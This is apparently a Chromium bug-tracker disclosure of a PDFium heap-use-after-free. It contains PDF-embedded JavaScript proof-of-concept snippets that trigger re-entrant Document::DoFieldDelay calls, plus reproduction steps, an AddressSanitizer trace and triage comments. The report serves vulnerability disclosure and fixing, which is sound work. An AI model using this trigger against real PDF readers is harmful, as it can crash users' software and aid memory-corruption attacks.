# Heap-use-after-free in CJS_WideStringArray::~CJS_WideStringArray

| Field | Value |
|-------|-------|
| **Issue ID** | [40082074](https://issues.chromium.org/issues/40082074) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>PDF |
| **Reporter** | ch...@gmail.com |
| **Assignee** | ju...@foxitsoftware.com |
| **Created** | 2015-05-14 |
| **Bounty** | $4,337.00 |

## Description

**VULNERABILITY DETAILS**

Bug is caused by in Document::DoFieldDelay method of third\_party\pdfium\fpdfsdk\src\javascript\Document.cpp.  

Attached test case causes Document::DoFieldDelay method to call itself again.  

So statement "delete pData" in Document::DoFieldDelay is executed twice.

Attached pdf files contain javascript code which causes this bug.  

To view that code open any of attached pdf files in a pdf editor.

1.Then first part of javascript code (below mentioned) is availbe under Document javascript option.  

function startDelay()  

{  

f = this.getField("txtName.");  

f.delay = true;  

f.value = 'test';  

//Setting value of text field triggers validate javascript code mentioned in step 2.  

//Which causes Document::DoFieldDelay method to re-enter.  

f.delay = false;  

}  

app.setTimeOut("startDelay()",3000);

2. Second part of javascript code (below mentioned) is availbe under validate option of txtName text field.  
   
   f1 = this.getField("txtName.");  
   
   f1.delay = true;  
   
   f1.value = 'test new';  
   
   f1.delay=false;

**VERSION**  

Chrome Version: [42.0.2311.152] + [stable]  

[44.0.2401.0] + [trunk]  

Operating System: Ubuntu 14.04 64 bit  

Windows 8.1 64 bit

**REPRODUCTION CASE**

1. Download poc\_stable.pdf and poc\_tot.pdf.
2. Open chrome
3. Open poc\_stable.pdf with chrome, if you are running stable chrome version.  
   
   or  
   
   Open poc\_tot.pdf with chrome, if you are running latest chrome built using latest code in trunk.  
   
   poc\_tot.pdf is slightly different from poc\_stable.pdf, because of a new bug in latest chrome code.
4. Wait 3 seconds.
5. PDF process will crash.  
   
   If you are running an asan build asan output will be shown in terminal.

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: [pdf process]  

Crash State: Address Sanitizer Output  

==5275==ERROR: AddressSanitizer: heap-use-after-free on address 0x60d00000b298 at pc 0x7f066b2d1153 bp 0x7ffd6c96b0e0 sp 0x7ffd6c96b0d8  

WRITE of size 8 at 0x60d00000b298 thread T0 (chrome)  

#0 0x7f066b2d1152 in CJS\_WideStringArray::~CJS\_WideStringArray() third\_party/pdfium/fpdfsdk/src/javascript/../../include/javascript/Field.h:60:2  

#1 0x7f066b2b604f in ~CJS\_DelayData third\_party/pdfium/fpdfsdk/src/javascript/../../include/javascript/Field.h:85:8  

#2 0x7f066b2b604f in Document::DoFieldDelay(CFX\_WideString const&, int) third\_party/pdfium/fpdfsdk/src/javascript/Document.cpp:1938:0  

#3 0x7f066b2fe447 in SetDelay third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:1307:4  

#4 0x7f066b2fe447 in delay third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:1320:0  

#5 0x7f066b2fe447 in void JSPropSetter<Field, &Field::delay>(char const\*, char const\*, v8::Local[v8::String](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&) third\_party/pdfium/fpdfsdk/src/javascript/../../include/javascript/JS\_Define.h:95:0  

#6 0x7f06635780d2 in v8::internal::PropertyCallbackArguments::Call(void (\*)(v8::Local[v8::Name](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&), v8::Local[v8::Name](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);)) v8/src/arguments.cc:89:1  

#7 0x7f066310828a in v8::internal::Object::SetPropertyWithAccessor(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::JSObject](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode) v8/src/objects.cc:377:5  

#8 0x7f06631391a9 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed, bool\*) v8/src/objects.cc:3201:16  

#9 0x7f066313893d in v8::internal::Object::SetProperty(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed) v8/src/objects.cc:3247:7  

#10 0x7f066301d436 in v8::internal::StoreIC::Store(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Object::StoreFromKeyed) v8/src/ic/ic.cc:1632:3  

#11 0x7f0663028886 in \_\_RT\_impl\_StoreIC\_Miss v8/src/ic/ic.cc:2470:3  

#12 0x7f0663028886 in v8::internal::StoreIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/ic/ic.cc:2461:0  

#9 0x7f060440647a (<unknown module>)  

#10 0x7f0604434ef6 (<unknown module>)  

#11 0x7f0604434ced (<unknown module>)  

#12 0x7f060442e61c (<unknown module>)  

#13 0x7f060441de61 (<unknown module>)  

#13 0x7f0662c6b8f9 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:128:9  

#14 0x7f0662a86418 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:1656:23  

#15 0x7f066b32c46f in JS\_Execute(v8::Isolate\*, IFXJS\_Context\*, wchar\_t const\*, long, FXJSErr\*) third\_party/pdfium/fpdfsdk/src/jsapi/fxjs\_v8.cpp:353:33  

#16 0x7f066b31cf38 in CJS\_Context::DoJob(int, CFX\_WideString const&, CFX\_WideString&) third\_party/pdfium/fpdfsdk/src/javascript/JS\_Context.cpp:75:11  

#17 0x7f066b31d40f in CJS\_Context::RunScript(CFX\_WideString const&, CFX\_WideString&) third\_party/pdfium/fpdfsdk/src/javascript/JS\_Context.cpp:114:9  

#18 0x7f066b28b233 in RunJsScript third\_party/pdfium/fpdfsdk/src/javascript/app.cpp:682:3  

#19 0x7f066b28b233 in app::TimerProc(CJS\_Timer\*) third\_party/pdfium/fpdfsdk/src/javascript/app.cpp:664:0  

#20 0x7f066b29a1a0 in CJS\_Timer::TimerProc(int) third\_party/pdfium/fpdfsdk/src/javascript/../../include/javascript/JS\_Object.h:268:30  

#21 0x7f0660a78df4 in chrome\_pdf::PDFiumEngine::OnCallback(int) pdf/pdfium/pdfium\_engine.cc:2426:3  

#22 0x7f0660ab1e8b in operator() ppapi/utility/completion\_callback\_factory.h:605:9  

#23 0x7f0660ab1e8b in pp::CompletionCallbackFactory<chrome\_pdf::OutOfProcessInstance, pp::ThreadSafeThreadTraits>::CallbackData<pp::CompletionCallbackFactory<chrome\_pdf::OutOfProcessInstance, pp::ThreadSafeThreadTraits>::Dispatcher0<void (chrome\_pdf::OutOfProcessInstance::\*)(int)> >::Thunk(void\*, int) ppapi/utility/completion\_callback\_factory.h:582:0  

#24 0x7f06691e0b18 in PP\_RunCompletionCallback ppapi/c/pp\_completion\_callback.h:240:3  

#25 0x7f06691e0b18 in CallWhileUnlocked<void, PP\_CompletionCallback \*, int, PP\_CompletionCallback \*, int> ppapi/shared\_impl/proxy\_lock.h:134:0  

#26 0x7f06691e0b18 in ppapi::proxy::(anonymous namespace)::CallbackWrapper(PP\_CompletionCallback, int) ppapi/proxy/ppb\_core\_proxy.cc:50:0  

#27 0x7f06691e0fee in Run base/bind\_internal.h:157:12  

#28 0x7f06691e0fee in MakeItSo base/bind\_internal.h:293:0  

#29 0x7f06691e0fee in base::internal::Invoker<IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(PP\_CompletionCallback, int)>, void (PP\_CompletionCallback, int), base::internal::TypeList<PP\_CompletionCallback, int> >, base::internal::TypeList<base::internal::UnwrapTraits<PP\_CompletionCallback>, base::internal::UnwrapTraits<int> >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(PP\_CompletionCallback, int)>, base::internal::TypeList<PP\_CompletionCallback const&, int const&> >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343:0  

#30 0x7f066702fab0 in Run base/callback.h:396:12  

#31 0x7f066702fab0 in ppapi::internal::RunWhileLockedHelper<void ()>::CallWhileLocked(scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > >) ppapi/shared\_impl/proxy\_lock.h:198:0  

#32 0x7f066702fd88 in Run base/bind\_internal.h:157:12  

#33 0x7f066702fd88 in MakeItSo base/bind\_internal.h:293:0  

#34 0x7f066702fd88 in base::internal::Invoker<IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > >)>, void (scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > >), base::internal::TypeList<base::internal::PassedWrapper<scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > >)>, base::internal::TypeList<scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343:0  

#35 0x7f0660bf1807 in Run base/callback.h:396:12  

#36 0x7f0660bf1807 in base::debug::TaskAnnotator::RunTask(char const\*, char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:62:0  

#37 0x7f0660b21657 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:444:3  

#38 0x7f0660b22ce3 in DeferOrRunPendingTask base/message\_loop/message\_loop.cc:454:5  

#39 0x7f0660b22ce3 in base::MessageLoop::DoDelayedWork(base::TimeTicks\*) base/message\_loop/message\_loop.cc:604:0  

#40 0x7f0660b27174 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:36:17  

#41 0x7f0660b4e298 in base::RunLoop::Run() base/run\_loop.cc:55:3  

#42 0x7f0660b1ffae in base::MessageLoop::Run() base/message\_loop/message\_loop.cc:303:3  

#43 0x7f066b66de44 in content::PpapiPluginMain(content::MainFunctionParams const&) content/ppapi\_plugin/ppapi\_plugin\_main.cc:141:3  

#44 0x7f0660a52bf9 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:310:14  

#45 0x7f0660a54b4f in content::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:788:12  

#46 0x7f0660a5218a in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:15  

#47 0x7f065fd184e2 in ChromeMain chrome/app/chrome\_main.cc:66:12  

#48 0x7f0655651ec4 in \_\_libc\_start\_main /build/buildd/eglibc-2.19/csu/libc-start.c:287:0

0x60d00000b298 is located 104 bytes inside of 136-byte region [0x60d00000b230,0x60d00000b2b8)  

freed by thread T0 (chrome) here:  

#0 0x7f065fd17b0b in operator delete(void\*) ??:0:0  

#1 0x7f066b2b607a in Document::DoFieldDelay(CFX\_WideString const&, int) third\_party/pdfium/fpdfsdk/src/javascript/Document.cpp:1938:5  

#2 0x7f066b2fe447 in SetDelay third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:1307:4  

#3 0x7f066b2fe447 in delay third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:1320:0  

#4 0x7f066b2fe447 in void JSPropSetter<Field, &Field::delay>(char const\*, char const\*, v8::Local[v8::String](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&) third\_party/pdfium/fpdfsdk/src/javascript/../../include/javascript/JS\_Define.h:95:0  

#5 0x7f06635780d2 in v8::internal::PropertyCallbackArguments::Call(void (\*)(v8::Local[v8::Name](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&), v8::Local[v8::Name](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);)) v8/src/arguments.cc:89:1  

#6 0x7f066310828a in v8::internal::Object::SetPropertyWithAccessor(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::JSObject](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode) v8/src/objects.cc:377:5  

#7 0x7f06631391a9 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed, bool\*) v8/src/objects.cc:3201:16  

#8 0x7f066313893d in v8::internal::Object::SetProperty(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed) v8/src/objects.cc:3247:7  

#9 0x7f066301d436 in v8::internal::StoreIC::Store(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Object::StoreFromKeyed) v8/src/ic/ic.cc:1632:3  

#10 0x7f0663028886 in \_\_RT\_impl\_StoreIC\_Miss v8/src/ic/ic.cc:2470:3  

#11 0x7f0663028886 in v8::internal::StoreIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/ic/ic.cc:2461:0  

#9 0x7f060440647a (<unknown module>)  

#10 0x7f060443519a (<unknown module>)  

#11 0x7f060442e61c (<unknown module>)  

#12 0x7f060441de61 (<unknown module>)  

#12 0x7f0662c6b8f9 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:128:9  

#13 0x7f0662a86418 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:1656:23  

#14 0x7f066b32c46f in JS\_Execute(v8::Isolate\*, IFXJS\_Context\*, wchar\_t const\*, long, FXJSErr\*) third\_party/pdfium/fpdfsdk/src/jsapi/fxjs\_v8.cpp:353:33  

#15 0x7f066b31cf38 in CJS\_Context::DoJob(int, CFX\_WideString const&, CFX\_WideString&) third\_party/pdfium/fpdfsdk/src/javascript/JS\_Context.cpp:75:11  

#16 0x7f066b31d40f in CJS\_Context::RunScript(CFX\_WideString const&, CFX\_WideString&) third\_party/pdfium/fpdfsdk/src/javascript/JS\_Context.cpp:114:9  

#17 0x7f066ad96c90 in CPDFSDK\_ActionHandler::RunFieldJavaScript(CPDFSDK\_Document\*, CPDF\_FormField\*, CPDF\_AAction::AActionType, \_PDFSDK\_FieldAction&, CFX\_WideString const&) third\_party/pdfium/fpdfsdk/src/fsdk\_actionhandler.cpp:670:17  

#18 0x7f066ad96577 in CPDFSDK\_ActionHandler::DoAction\_FieldJavaScript(CPDF\_Action const&, CPDF\_AAction::AActionType, CPDFSDK\_Document\*, CPDF\_FormField\*, \_PDFSDK\_FieldAction&) third\_party/pdfium/fpdfsdk/src/fsdk\_actionhandler.cpp:84:4  

#19 0x7f066ad87c83 in CPDFSDK\_InterForm::OnValidate(CPDF\_FormField\*, CFX\_WideString&, int&) third\_party/pdfium/fpdfsdk/src/fsdk\_baseform.cpp:2144:4  

#20 0x7f066ad8b134 in CPDFSDK\_InterForm::BeforeValueChange(CPDF\_FormField const\*, CFX\_WideString&) third\_party/pdfium/fpdfsdk/src/fsdk\_baseform.cpp:2506:4  

#21 0x7f066add4bb7 in CPDF\_FormField::SetValue(CFX\_WideString const&, int, int) third\_party/pdfium/core/src/fpdfdoc/doc\_formfield.cpp:356:32  

#22 0x7f066b2f1f07 in Field::SetValue(CPDFSDK\_Document\*, CFX\_WideString const&, int, CJS\_WideStringArray const&) third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:3240:5  

#23 0x7f066b2b6046 in Document::DoFieldDelay(CFX\_WideString const&, int) third\_party/pdfium/fpdfsdk/src/javascript/Document.cpp:1937:5  

#24 0x7f066b2fe447 in SetDelay third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:1307:4  

#25 0x7f066b2fe447 in delay third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:1320:0  

#26 0x7f066b2fe447 in void JSPropSetter<Field, &Field::delay>(char const\*, char const\*, v8::Local[v8::String](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&) third\_party/pdfium/fpdfsdk/src/javascript/../../include/javascript/JS\_Define.h:95:0  

#27 0x7f06635780d2 in v8::internal::PropertyCallbackArguments::Call(void (\*)(v8::Local[v8::Name](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&), v8::Local[v8::Name](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);)) v8/src/arguments.cc:89:1  

#28 0x7f066310828a in v8::internal::Object::SetPropertyWithAccessor(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::JSObject](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode) v8/src/objects.cc:377:5  

#29 0x7f06631391a9 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed, bool\*) v8/src/objects.cc:3201:16  

#30 0x7f066313893d in v8::internal::Object::SetProperty(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed) v8/src/objects.cc:3247:7

previously allocated by thread T0 (chrome) here:  

#0 0x7f065fd1754b in operator new(unsigned long) ??:0:0  

#1 0x7f066b2f1329 in Field::AddDelay\_WideStringArray(FIELD\_PROP, CJS\_WideStringArray const&) third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:3986:28  

#2 0x7f066b2f0ab9 in Field::value(IFXJS\_Context\*, CJS\_PropValue&, CFX\_WideString&) third\_party/pdfium/fpdfsdk/src/javascript/Field.cpp:3100:4  

#3 0x7f066b30ceec in void JSPropSetter<Field, &Field::value>(char const\*, char const\*, v8::Local[v8::String](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&) third\_party/pdfium/fpdfsdk/src/javascript/../../include/javascript/JS\_Define.h:95:8  

#4 0x7f06635780d2 in v8::internal::PropertyCallbackArguments::Call(void (\*)(v8::Local[v8::Name](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);), v8::PropertyCallbackInfo<void> const&), v8::Local[v8::Name](javascript:void(0);), v8::Local[v8::Value](javascript:void(0);)) v8/src/arguments.cc:89:1  

#5 0x7f066310828a in v8::internal::Object::SetPropertyWithAccessor(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::JSObject](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode) v8/src/objects.cc:377:5  

#6 0x7f06631391a9 in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed, bool\*) v8/src/objects.cc:3201:16  

#7 0x7f066313893d in v8::internal::Object::SetProperty(v8::internal::LookupIterator\*, v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::LanguageMode, v8::internal::Object::StoreFromKeyed) v8/src/objects.cc:3247:7  

#8 0x7f066301d436 in v8::internal::StoreIC::Store(v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Handle[v8::internal::Name](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), v8::internal::Object::StoreFromKeyed) v8/src/ic/ic.cc:1632:3  

#9 0x7f0663028886 in \_\_RT\_impl\_StoreIC\_Miss v8/src/ic/ic.cc:2470:3  

#10 0x7f0663028886 in v8::internal::StoreIC\_Miss(int, v8::internal::Object\*\*, v8::internal::Isolate\*) v8/src/ic/ic.cc:2461:0  

#10 0x7f060440647a (<unknown module>)  

#11 0x7f0604434ebe (<unknown module>)  

#12 0x7f0604434ced (<unknown module>)  

#13 0x7f060442e61c (<unknown module>)  

#14 0x7f060441de61 (<unknown module>)  

#11 0x7f0662c6b8f9 in v8::internal::Invoke(bool, v8::internal::Handle[v8::internal::JSFunction](javascript:void(0);), v8::internal::Handle[v8::internal::Object](javascript:void(0);), int, v8::internal::Handle[v8::internal::Object](javascript:void(0);)\*) v8/src/execution.cc:128:9  

#12 0x7f0662a86418 in v8::Script::Run(v8::Local[v8::Context](javascript:void(0);)) v8/src/api.cc:1656:23  

#13 0x7f066b32c46f in JS\_Execute(v8::Isolate\*, IFXJS\_Context\*, wchar\_t const\*, long, FXJSErr\*) third\_party/pdfium/fpdfsdk/src/jsapi/fxjs\_v8.cpp:353:33  

#14 0x7f066b31cf38 in CJS\_Context::DoJob(int, CFX\_WideString const&, CFX\_WideString&) third\_party/pdfium/fpdfsdk/src/javascript/JS\_Context.cpp:75:11  

#15 0x7f066b31d40f in CJS\_Context::RunScript(CFX\_WideString const&, CFX\_WideString&) third\_party/pdfium/fpdfsdk/src/javascript/JS\_Context.cpp:114:9  

#16 0x7f066b28b233 in RunJsScript third\_party/pdfium/fpdfsdk/src/javascript/app.cpp:682:3  

#17 0x7f066b28b233 in app::TimerProc(CJS\_Timer\*) third\_party/pdfium/fpdfsdk/src/javascript/app.cpp:664:0  

#18 0x7f066b29a1a0 in CJS\_Timer::TimerProc(int) third\_party/pdfium/fpdfsdk/src/javascript/../../include/javascript/JS\_Object.h:268:30  

#19 0x7f0660a78df4 in chrome\_pdf::PDFiumEngine::OnCallback(int) pdf/pdfium/pdfium\_engine.cc:2426:3  

#20 0x7f0660ab1e8b in operator() ppapi/utility/completion\_callback\_factory.h:605:9  

#21 0x7f0660ab1e8b in pp::CompletionCallbackFactory<chrome\_pdf::OutOfProcessInstance, pp::ThreadSafeThreadTraits>::CallbackData<pp::CompletionCallbackFactory<chrome\_pdf::OutOfProcessInstance, pp::ThreadSafeThreadTraits>::Dispatcher0<void (chrome\_pdf::OutOfProcessInstance::\*)(int)> >::Thunk(void\*, int) ppapi/utility/completion\_callback\_factory.h:582:0  

#22 0x7f06691e0b18 in PP\_RunCompletionCallback ppapi/c/pp\_completion\_callback.h:240:3  

#23 0x7f06691e0b18 in CallWhileUnlocked<void, PP\_CompletionCallback \*, int, PP\_CompletionCallback \*, int> ppapi/shared\_impl/proxy\_lock.h:134:0  

#24 0x7f06691e0b18 in ppapi::proxy::(anonymous namespace)::CallbackWrapper(PP\_CompletionCallback, int) ppapi/proxy/ppb\_core\_proxy.cc:50:0  

#25 0x7f06691e0fee in Run base/bind\_internal.h:157:12  

#26 0x7f06691e0fee in MakeItSo base/bind\_internal.h:293:0  

#27 0x7f06691e0fee in base::internal::Invoker<IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(PP\_CompletionCallback, int)>, void (PP\_CompletionCallback, int), base::internal::TypeList<PP\_CompletionCallback, int> >, base::internal::TypeList<base::internal::UnwrapTraits<PP\_CompletionCallback>, base::internal::UnwrapTraits<int> >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(PP\_CompletionCallback, int)>, base::internal::TypeList<PP\_CompletionCallback const&, int const&> >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343:0  

#28 0x7f066702fab0 in Run base/callback.h:396:12  

#29 0x7f066702fab0 in ppapi::internal::RunWhileLockedHelper<void ()>::CallWhileLocked(scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > >) ppapi/shared\_impl/proxy\_lock.h:198:0  

#30 0x7f066702fd88 in Run base/bind\_internal.h:157:12  

#31 0x7f066702fd88 in MakeItSo base/bind\_internal.h:293:0  

#32 0x7f066702fd88 in base::internal::Invoker<IndexSequence<0ul>, base::internal::BindState<base::internal::RunnableAdapter<void (\*)(scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > >)>, void (scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > >), base::internal::TypeList<base::internal::PassedWrapper<scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > > > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > > > > >, base::internal::InvokeHelper<false, void, base::internal::RunnableAdapter<void (\*)(scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > >)>, base::internal::TypeList<scoped\_ptr<ppapi::internal::RunWhileLockedHelper<void ()>, base::DefaultDeleter<ppapi::internal::RunWhileLockedHelper<void ()> > > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:343:0  

#33 0x7f0660bf1807 in Run base/callback.h:396:12  

#34 0x7f0660bf1807 in base::debug::TaskAnnotator::RunTask(char const\*, char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:62:0  

#35 0x7f0660b21657 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:444:3

## Attachments

- [poc_tot.pdf](attachments/poc_tot.pdf) (application/pdf, 1.7 KB)
- [poc_stable.pdf](attachments/poc_stable.pdf) (application/pdf, 1.7 KB)
- [testuafdocument2.pdf](attachments/testuafdocument2.pdf) (application/pdf, 1.5 KB)
- [testuafdocument1.pdf](attachments/testuafdocument1.pdf) (application/pdf, 1.6 KB)
- [test_allocate.pdf](attachments/test_allocate.pdf) (application/pdf, 2.0 KB)

## Timeline

### in...@chromium.org (2015-05-14)

[Empty comment from Monorail migration]

### ch...@gmail.com (2015-05-15)

What is the severity of this issue?

### ch...@gmail.com (2015-05-17)

[Comment Deleted]

### ch...@gmail.com (2015-05-17)

Please use poc_stable.pdf to reproduce in both chrome stable and trunk builds now.
poc_tot.pdf does not reproduce in trunk build now.

A different test case is required earlier in trunk build due to below mentioned pdfium bug .
https://code.google.com/p/pdfium/issues/detail?id=160
That bug is fixed now.

### cl...@chromium.org (2015-05-18)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-05-22)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-05-26)

[Empty comment from Monorail migration]

### ch...@gmail.com (2015-05-29)

I wrote a patch to fix this issue and I'd like to submit it for review.
Shall I submit the patch using guidelines mentioned in below mentioned page?
http://www.chromium.org/developers/contributing-code

Or are there separate guidelines for security issues?For example is there anything I should do to hide the code review from public?

### ts...@chromium.org (2015-05-29)

git cl upload --private if you want to keep the review hidden.  But we rarely do this, since the time window between a proposed patch review and checkin (when it becomes public anywas) is small (compared to the time a bug may sit idle).



### ts...@chromium.org (2015-05-29)

[Comment Deleted]

### cl...@chromium.org (2015-05-30)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-05-30)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=4826228446461952

### cl...@chromium.org (2015-05-30)

ClusterFuzz is analyzing your testcase. Chromium developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6006007101128704

### np...@chromium.org (2015-05-30)

Clusterfuzz repro'd 

### cl...@chromium.org (2015-05-31)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=6006007101128704

Uploader: nparker@google.com
Job Type: Linux_asan_chrome_mp

Crash Type: Heap-use-after-free WRITE 8
Crash Address: 0x611000038c68
Crash State:
  CJS_WideStringArray::~CJS_WideStringArray
  Document::DoFieldDelay
  void JSPropSetter<Field, &Field::delay>
  
Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=271393:271739

